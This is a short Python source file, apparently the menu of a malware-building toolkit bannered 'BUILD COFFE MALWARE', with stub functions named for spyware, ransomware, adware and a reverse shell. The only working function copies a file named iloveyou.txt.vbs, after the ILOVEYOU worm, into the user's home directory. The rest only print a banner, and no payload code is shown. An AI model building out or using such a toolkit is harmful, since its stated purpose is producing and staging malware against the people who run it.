import os, sys
from time import sleep as wait
#from src.iloveyou import *

build_banner = """
  --==[ BUILD COFFE MALWARE ]==--
"""

def buildexe():
  print(build_banner)
  print()

def iloveyou():
  print(build_banner)
  print('[+] Building iloveyou.txt.vbs')
  wait(5)
  os.system('cp core/src/iloveyou.txt.vbs $HOME')
  print('[+] iloveyou.txt.vbs has moved to HOME')
  sys.exit()

def spyware():
  print(build_banner)
  print()

def ransomware():
  print(build_banner)
  print()

def admalware():
  print(build_banner)
  print()

def rvshell():
  print(build_banner)
  print()
